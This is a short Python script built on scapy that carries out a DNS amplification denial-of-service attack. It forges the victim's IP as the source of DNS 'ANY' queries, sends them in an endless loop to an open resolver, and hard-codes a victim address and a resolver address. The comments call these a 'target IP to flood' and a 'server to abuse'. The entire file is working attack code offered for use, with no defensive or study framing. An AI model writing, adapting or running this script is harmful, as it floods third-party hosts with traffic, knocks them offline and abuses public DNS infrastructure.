from scapy.all import *

def dns_amplification(victim_ip, dns_server_ip):
    domain = "example.com"  # Domain to query for amplification

    # Craft the spoofed DNS query
    dns_query = IP(src=victim_ip, dst=dns_server_ip)/\
                UDP(dport=53)/\
                DNS(rd=1, qd=DNSQR(qname=domain, qtype="ANY"))

    while True:
        send(dns_query, verbose=False)
        print(f"Sent spoofed DNS request to {dns_server_ip} for {domain}")

# Replace these IPs with your setup
victim_ip = "10.0.2.15"  # Target IP to flood
dns_server_ip = "93.184.215.14"  # Open DNS resolver or server to abuse

dns_amplification(victim_ip, dns_server_ip)